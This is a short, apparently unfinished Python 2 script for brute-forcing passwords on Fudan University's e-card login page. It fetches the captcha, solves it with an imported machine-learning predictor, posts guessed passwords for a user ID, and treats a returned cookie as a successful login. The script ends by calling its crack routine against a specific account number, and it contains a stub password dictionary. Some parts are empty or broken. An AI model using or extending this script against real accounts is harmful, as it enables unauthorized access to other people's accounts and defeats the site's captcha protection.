# -*- coding: utf-8 -*-
import urllib2,urllib,cookielib,cStringIO
from pre import predict
import gevent
from gevent import Greenlet

crackd=["12345"]
#字典
def loaddict():
    global crackd
    crackd=[]
def addtrain_fail():
    pass

def addtrain_succ():
    pass

def trypwd(uid,pwd):
    print "start:p",pwd
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    opener.addheaders = [('Referer', 'https://www.ecard.fudan.edu.cn/web/guest/home'),
        ('User-agent', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118')]
    opener.open("https://www.ecard.fudan.edu.cn/web/guest/home")
    f=cStringIO.StringIO(opener.open("https://www.ecard.fudan.edu.cn/captcha/challenge").read())
    capcode=predict(f)
    print "code:",capcode

    requrl="https://www.ecard.fudan.edu.cn/web/guest/home"
    formdata=urllib.urlencode({"_58_remember_me":"false",
                               "_58_login":str(uid),
                               "_58_password":str(pwd),
                               "authCode":capcode})
    result=opener.open(requrl,formdata).headers
    if result.has_key("set-cookie"):
        print "Success:",uid,pwd
    return result.read()

def crack(uid):
    global crackd
    
    
crack("13307130364")
